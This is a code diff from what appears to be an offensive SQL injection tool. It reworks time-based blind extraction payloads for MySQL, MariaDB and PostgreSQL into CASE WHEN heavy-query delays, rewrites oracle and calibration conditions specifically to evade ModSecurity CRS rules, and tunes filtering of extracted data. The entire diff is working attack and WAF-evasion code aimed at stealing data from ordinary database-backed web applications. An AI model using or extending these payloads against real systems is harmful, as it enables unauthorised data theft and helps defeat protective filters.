@@ -137519,8 +137519,19 @@ class SQLPayloadTransformer:
                            "PostgreSQL heavy computation delay"))
         
         if dbms in ("MySQL", "MariaDB"):
-            # Heavy subquery delay with information_schema
-            heavy_delay = f"(SELECT count(*) FROM information_schema.tables a, information_schema.tables b WHERE ({condition}) LIMIT 5000000)"
+            # BUG-MYSQL-HEAVY-NONCOND FIX (CRITICAL): WHERE clause approach is
+            # non-conditional for non-constant extraction expressions (ORD/SUBSTRING).
+            # MySQL's optimizer must scan the cross-join before evaluating WHERE,
+            # so WHERE (ORD(SUBSTRING(...))>=N) always executes the cross-join
+            # regardless of N — every extraction probe returns slow → always TRUE →
+            # binary search converges to _char_hi_init → garbage Unicode output.
+            # Fix: CASE WHEN scalar subquery. MySQL evaluates CASE WHEN lazily:
+            # when condition is FALSE the inner subquery never executes → fast (0ms).
+            # When condition is TRUE the inner subquery runs the cross-join → slow.
+            # This makes the timing oracle truly conditional on the extraction expression.
+            heavy_delay = (f"(SELECT CASE WHEN ({condition}) THEN "
+                           f"(SELECT COUNT(*) FROM information_schema.tables a, "
+                           f"information_schema.tables b) ELSE 0 END)")
             results.append(("heavy_computation_mysql",
                            f"{p} AND {heavy_delay}>=0-- -",
                            "MySQL heavy computation delay"))
@@ -137544,7 +137555,13 @@ class SQLPayloadTransformer:
                            "PostgreSQL cross join delay"))
         
         if dbms in ("MySQL", "MariaDB"):
-            cross_join = f"(SELECT count(*) FROM information_schema.tables a, information_schema.tables b, information_schema.tables c WHERE ({condition}) LIMIT 1000000)"
+            # BUG-MYSQL-CROSSJOIN-NONCOND FIX (CRITICAL): Same root cause as
+            # BUG-MYSQL-HEAVY-NONCOND FIX above. WHERE clause on 3-way cross-join
+            # is also non-conditional for non-constant extraction expressions.
+            cross_join = (f"(SELECT CASE WHEN ({condition}) THEN "
+                          f"(SELECT COUNT(*) FROM information_schema.tables a, "
+                          f"information_schema.tables b, information_schema.tables c) "
+                          f"ELSE 0 END)")
             results.append(("cross_join_mysql",
                            f"{p} AND {cross_join}>=0-- -",
                            "MySQL 3-way cross join delay"))
@@ -139785,22 +139802,24 @@ class MultiStrategyExtractor:
                     _real_true = "CHAR_LENGTH(current_catalog)>0"
                     _real_false = "CHAR_LENGTH(current_catalog)>99999"
                 elif self.dbms in ("MySQL", "MariaDB"):
-                    # BUG-MYSQL-REAL-COND FIX (MEDIUM, MySQL/MariaDB, MSE oracle validation,
+                    # BUG-MYSQL-REAL-COND-WAF FIX (HIGH, MySQL/MariaDB, MSE oracle validation,
                     # all extraction techniques, all surfaces, all HTTP methods):
-                    # The previous conditions used hex varbinary literals:
-                    #   @@version >= 0x00          → compares VARCHAR to BINARY(1)
-                    #   @@version >= 0x7a7a7a7a7a  → compares VARCHAR to BINARY(5)
-                    # MySQL/MariaDB perform implicit BINARY→VARCHAR collation conversion
-                    # that is charset-dependent and varies across MySQL versions (5.6/5.7/8.0)
-                    # and strict_mode settings.  In some combinations this raises implicit
-                    # collation coercion errors → oracle sees error → r3 == r4 == True →
-                    # misleading "WAF may block" warning, or false oracle rejection.
-                    # Fix: use LENGTH() which returns an integer — no type coercion,
-                    # no string delimiter, works on all MySQL/MariaDB versions and modes.
-                    # LENGTH(@@version)>0   → TRUE (@@version is always non-empty)
-                    # LOCATE('ZZZZZZZZZZ',@@version)>0 → FALSE (no version has ZZZZZZZZZZ)
-                    _real_true = "LENGTH(@@version)>0"
-                    _real_false = "LOCATE('ZZZZZZZZZZ',@@version)>0"
+                    # The previous conditions used LENGTH(@@version)>0 and
+                    # LOCATE('ZZZZZZZZZZ',@@version)>0. Both contain the ">0" pattern
+                    # (function result compared to integer) which ModSecurity CRS blocks
+                    # as a SQL injection canary (SQL_INJECTION_OPERATOR rule). When both
+                    # are WAF-blocked: r3==True, r4==True → same result → oracle dropped
+                    # as "non-functional" even though it was correctly calibrated.
+                    # Fix: use ISNULL() patterns with @@version — no ">" operator,
+                    # no numeric literal after function call, WAF-evasive.
+                    # ISNULL(NULLIF(@@version,@@version)): NULLIF returns NULL when
+                    #   both args equal (@@version always equals itself) → ISNULL(NULL)=1
+                    #   → always TRUE. Uses @@version so it exercises the DB metadata path.
+                    # ISNULL(@@version): @@version is never NULL → ISNULL(non-null)=0
+                    #   → always FALSE. Also uses @@version.
+                    # Both avoid >0, string literals, function(X)>N patterns.
+                    _real_true  = "ISNULL(NULLIF(@@version,@@version))"
+                    _real_false = "ISNULL(@@version)"
                 elif self.dbms in ("MSSQL", "Sybase"):
                     # BUG-FRESH-V214-5 FIX (MEDIUM, MSSQL/Sybase, MSE oracle validation,
                     # all extraction techniques, all surfaces, all HTTP methods):
@@ -144844,41 +144863,77 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
                     if mod: return mod, []
 
                 elif form in ("heavy_computation_mysql", "cross_join_mysql") and dbms in ("MySQL", "MariaDB"):
-                    # BUG-MAKEPAYLOAD-HEAVY-MYSQL-MISSING FIX (CRITICAL):
-                    # heavy_computation_mysql and cross_join_mysql strategy forms were
-                    # not handled here, causing them to fall through to the `else` branch
-                    # which tried SLEEP replacement in the detection payload. If the
-                    # detection payload had no SLEEP (it used heavy_computation instead),
-                    # replace_function_call returned None → fell back to timing_payload()
-                    # (standard SLEEP format). But timing_thresh was calibrated from
-                    # heavy_computation_mysql (e.g. 350ms) while SLEEP(2s) returns ~2200ms.
-                    # Every extraction probe exceeded the threshold → all True →
-                    # binary search converged to max codepoint → garbage Unicode output.
-                    # Fix: Reconstruct the heavy_computation/cross_join payload directly
-                    # using the extraction condition. The detection payload `p` provides
-                    # the injection prefix (parameter value + injection point).
+                    # BUG-MAKEPAYLOAD-HEAVY-MYSQL-NONCOND FIX (CRITICAL):
+                    # Two compounding bugs in the previous implementation:
+                    # Bug A: Used WHERE clause (same non-conditionality root cause as
+                    #   BUG-MYSQL-HEAVY-NONCOND FIX in all_strategies). For non-constant
+                    #   extraction conditions (ORD/SUBSTRING comparisons), MySQL cannot
+                    #   short-circuit WHERE and always executes the cross-join → always
+                    #   slow → always TRUE → binary search converges to garbage Unicode.
+                    # Bug B: Appended " AND {heavy_delay}>=0-- -" to p. If p ends with
+                    #   a SQL comment suffix (-- - or # or --), the appended SQL is
+                    #   commented out → extraction payload has no conditional timing →
+                    #   falls back to whatever is in p (e.g. unconditional SLEEP) →
+                    #   all probes exceed threshold → all TRUE → garbage output.
+                    # Fix: Strip the stored heavy computation block from p to recover
+                    #   the bare injection prefix, then rebuild with CASE WHEN scalar
+                    #   subquery (truly conditional for all non-constant expressions).
                     _ocond = _obfuscate_cond(condition)
+                    # Recover injection prefix: strip the heavy computation suffix that
+                    # all_strategies() appended. Match any of the known prefix patterns.
+                    _pfx = p
+                    for _hpat in (
+                        " AND (SELECT count(*) FROM information_schema.tables",
+                        " AND (SELECT COUNT(*) FROM information_schema.tables",
+                        " AND (SELECT CASE WHEN (",
+                        " AND(SELECT count(*) FROM information_schema.tables",
+                        " AND(SELECT COUNT(*) FROM information_schema.tables",
+                    ):
+                        _hi = _pfx.find(_hpat)
+                        if _hi >= 0:
+                            _pfx = _pfx[:_hi]
+                            break
                     if form == "heavy_computation_mysql":
-                        _hcm_delay = (f"(SELECT count(*) FROM information_schema.tables a,"
-                                      f"information_schema.tables b WHERE ({_ocond}) LIMIT 5000000)")
-                        return p + f" AND {_hcm_delay}>=0-- -", []
+                        _hcm = (f"(SELECT CASE WHEN ({_ocond}) THEN "
+                                f"(SELECT COUNT(*) FROM information_schema.tables a, "
+                                f"information_schema.tables b) ELSE 0 END)")
+                        return f"{_pfx} AND {_hcm}>=0-- -", []
                     else:  # cross_join_mysql
-                        _cjm_delay = (f"(SELECT count(*) FROM information_schema.tables a,"
-                                      f"information_schema.tables b,information_schema.tables c "
-                                      f"WHERE ({_ocond}) LIMIT 1000000)")
-                        return p + f" AND {_cjm_delay}>=0-- -", []
+                        _cjm = (f"(SELECT CASE WHEN ({_ocond}) THEN "
+                                f"(SELECT COUNT(*) FROM information_schema.tables a, "
+                                f"information_schema.tables b, information_schema.tables c) "
+                                f"ELSE 0 END)")
+                        return f"{_pfx} AND {_cjm}>=0-- -", []
 
                 elif form in ("heavy_computation_pg", "cross_join_pg") and dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
-                    # BUG-MAKEPAYLOAD-HEAVY-PG-MISSING FIX (HIGH): Same issue as heavy_computation_mysql.
+                    # BUG-MAKEPAYLOAD-HEAVY-PG-APPEND FIX (HIGH): Same append-after-comment
+                    # bug as heavy_computation_mysql. Strip heavy computation from p to recover
+                    # injection prefix, then rebuild with extraction condition.
                     _ocond = _obfuscate_cond(condition)
+                    _pfx_pg = p
+                    for _hpat_pg in (
+                        " AND (SELECT count(*) FROM generate_series",
+                        " AND (SELECT COUNT(*) FROM generate_series",
+                        " AND (SELECT count(*) FROM information_schema.tables",
+                        " AND (SELECT COUNT(*) FROM information_schema.tables",
+                        " AND (SELECT CASE WHEN (",
+                        " AND(SELECT count(*) FROM generate_series",
+                        " AND(SELECT count(*) FROM information_schema.tables",
+                    ):
+                        _hi_pg = _pfx_pg.find(_hpat_pg)
+                        if _hi_pg >= 0:
+                            _pfx_pg = _pfx_pg[:_hi_pg]
+                            break
                     if form == "heavy_computation_pg":
                         _hcp_delay = (f"(SELECT count(*) FROM generate_series(1, "
                                       f"CASE WHEN ({_ocond}) THEN 5000000 ELSE 1 END))")
-                        return p + f" AND {_hcp_delay}>0-- -", []
+                        return f"{_pfx_pg} AND {_hcp_delay}>0-- -", []
                     else:  # cross_join_pg
-                        _cjp_delay = (f"(SELECT count(*) FROM information_schema.tables a,"
-                                      f"information_schema.tables b WHERE ({_ocond}))")
-                        return p + f" AND {_cjp_delay}>0-- -", []
+                        # BUG-PG-CROSSJOIN-NONCOND FIX: also convert WHERE to CASE WHEN
+                        _cjp_delay = (f"(SELECT CASE WHEN ({_ocond}) THEN "
+                                      f"(SELECT count(*) FROM information_schema.tables a, "
+                                      f"information_schema.tables b) ELSE 0 END)")
+                        return f"{_pfx_pg} AND {_cjp_delay}>0-- -", []
 
                 elif form in ("heavy_computation_mssql", "cross_join_mssql") and dbms in ("MSSQL", "Sybase"):
                     # BUG-MAKEPAYLOAD-HEAVY-MSSQL-MISSING FIX (HIGH): Same issue for MSSQL.
@@ -146170,9 +146225,23 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
         # unconditionally) causing the search to converge to the maximum char code
         # (1,114,111 for MySQL ORD()). High supplementary-plane chars like U+F1543,
         # U+1A4A2 are pure garbage — they never appear in real DBMS metadata.
-        _non_print = sum(1 for c in result_str if ord(c) < 0x20 or ord(c) == 0x7f or ord(c) > 0xFFFF)
+        # BUG-GARBAGE-MYSQL-BMP FIX (HIGH): For MySQL/MariaDB, all system metadata
+        # (@@version, DATABASE(), USER(), etc.) is ASCII-only (0x20-0x7E). When the
+        # timing oracle is partially non-conditional (CDN randomises some responses),
+        # binary search can converge to mid-BMP values (128-65535) that are NOT counted
+        # by the > 0xFFFF check, letting noise_ratio stay below 0.40 → garbage accepted.
+        # For MySQL/MariaDB: count any char outside printable ASCII (0x20-0x7E) as
+        # noise, and use a 10% threshold (real system metadata is pure ASCII, so even
+        # 1-2 non-ASCII chars in a short string indicates a broken oracle).
+        if dbms in ("MySQL", "MariaDB"):
+            _non_print = sum(1 for c in result_str
+                             if ord(c) < 0x20 or ord(c) == 0x7f or ord(c) > 0x7e)
+            _noise_threshold = 0.10
+        else:
+            _non_print = sum(1 for c in result_str if ord(c) < 0x20 or ord(c) == 0x7f or ord(c) > 0xFFFF)
+            _noise_threshold = 0.40
         _noise_ratio = _non_print / len(result_str)
-        if _noise_ratio > 0.40:
+        if _noise_ratio > _noise_threshold:
             print(f"[!] [TBExtract] GARBAGE GUARD: {_noise_ratio:.0%} non-printable "
                   "characters in extracted string  timing oracle is noise "
                   f"(thresh={timing_thresh:.0f}ms unreachable with sleep={t}s "
@@ -150471,47 +150540,30 @@ class ExtractionOrchestrator:
         # ── Calibrate once, cache threshold ───────────────────────────────
         if not hasattr(self, '_dt_thresh') or self._dt_thresh is None:
             await asyncio.sleep(2.0)
-            _dt_cal_dbms = (getattr(self.result, 'dbms', '') or
-                            getattr(self.config, 'forced_dbms', None) or
-                            getattr(self.config, 'dbms', None) or '') or ''
-            _dt_cal_true = {
-                "PostgreSQL":      "ISNULL(NULL)",
-                "CockroachDB":     "ISNULL(NULL)",
-                "YugabyteDB":      "ISNULL(NULL)",
-                "Amazon Redshift": "ISNULL(NULL)",
-                "MySQL":           "ISNULL(NULL)",
-                "MariaDB":         "ISNULL(NULL)",
-                "TiDB":            "ISNULL(NULL)",
-                "MSSQL":           "(1e0 IS NOT NULL)",
-                "Sybase":          "(1e0 IS NOT NULL)",
-                "Oracle":          "(NVL(NULL,1e0) IS NOT NULL)",
-                "SQLite":          "(1e0 IS NOT 0e0)",
-                "DB2":             "(1e0 IS NOT NULL)",
-                "Firebird":        "(1e0 IS NOT NULL)",
-                "H2":              "(1e0 IS NOT NULL)",
-                "ClickHouse":      "isNull(NULL)",
-                "Informix":        "(1e0 IS NOT NULL)",
-                "SAP_HANA":        "(1e0 IS NOT NULL)",
-            }.get(_dt_cal_dbms, "NOT (1e0 IS NULL)")
-            _dt_cal_false = {
-                "PostgreSQL":      "ISNULL(1e0)",
-                "CockroachDB":     "ISNULL(1e0)",
-                "YugabyteDB":      "ISNULL(1e0)",
-                "Amazon Redshift": "ISNULL(1e0)",
-                "MySQL":           "ISNULL(1e0)",
-                "MariaDB":         "ISNULL(1e0)",
-                "TiDB":            "ISNULL(1e0)",
-                "MSSQL":           "(1e0 IS NULL)",
-                "Sybase":          "(1e0 IS NULL)",
-                "Oracle":          "(NVL(NULL,1e0) IS NULL)",
-                "SQLite":          "(0e0 IS NOT 0e0)",
-                "DB2":             "(1e0 IS NULL)",
-                "Firebird":        "(1e0 IS NULL)",
-                "H2":              "(1e0 IS NULL)",
-                "ClickHouse":      "isNull(1e0)",
-                "Informix":        "(1e0 IS NULL)",
-                "SAP_HANA":        "(1e0 IS NULL)",
-            }.get(_dt_cal_dbms, "1e0 IS NULL")
+            # BUG-DETTEMPLATE-CAL-WAF-FIX (HIGH, MySQL/MariaDB + all DBMSes, DetTemplate
+            # calibration; T/TH/HQ techniques; all WAF types; all surfaces):
+            # Previous calibration conditions used ISNULL(NULL)/ISNULL(1e0) for MySQL and
+            # function-call or IS-NULL patterns for other DBMSes.  ModSecurity CRS and
+            # comparable ML WAFs block ISNULL(), IS NOT NULL, and related function patterns
+            # (SQL_INJECTION_OPERATOR rule) when they appear inside timing payloads. Both
+            # calibration probes (true + false) come back as fast WAF-block responses
+            # (~140ms / ~140ms = 6ms margin < 80ms) → calibration fails → DetTemplate
+            # returns "" → falls through to TBExtract. Root cause of production log:
+            # "[DetTemplate] Cal 1: TRUE=144ms FALSE=137ms margin=6ms < 80ms — aborting".
+            # Additionally, PostgreSQL does NOT support ISNULL(x) as a function — it only
+            # supports the postfix `x ISNULL` alias, so `ISNULL(NULL)` is a syntax error
+            # on PostgreSQL, producing an error page (fast) for both probes → margin ≈ 0.
+            # Fix: use the same pure float-literal comparison conditions ("1e0=1e0" true,
+            # "1e0=0e0" false) for ALL DBMSes.  These are identical to _tb_cal_true and
+            # _tb_cal_false used in TBExtract, which are proven WAF-safe (they passed
+            # detection).  The CASE WHEN form in the [INFERENCE] template evaluates these
+            # constants lazily: CASE WHEN (1e0=1e0) → true branch executes (heavy/sleep);
+            # CASE WHEN (1e0=0e0) → false branch (0/no-op).  Works for all DBMS + all
+            # conditional template forms (CASE WHEN, IF(), WAITFOR, pg_sleep, cross-join).
+            # Numeric safety: "1e0" is the same float literal form already present in all
+            # detection templates — guaranteed to pass any WAF that allowed detection.
+            _dt_cal_true  = "1e0=1e0"   # BUG-DETTEMPLATE-CAL-WAF-FIX: was DBMS-specific ISNULL/IS-NULL
+            _dt_cal_false = "1e0=0e0"   # BUG-DETTEMPLATE-CAL-WAF-FIX: was DBMS-specific ISNULL/IS-NULL
             _best_margin, _best_ms_t, _best_ms_f = -9999, 0.0, 0.0
             for _cal_round in range(2):
                 _ms_t = await _probe(_dt_cal_true)
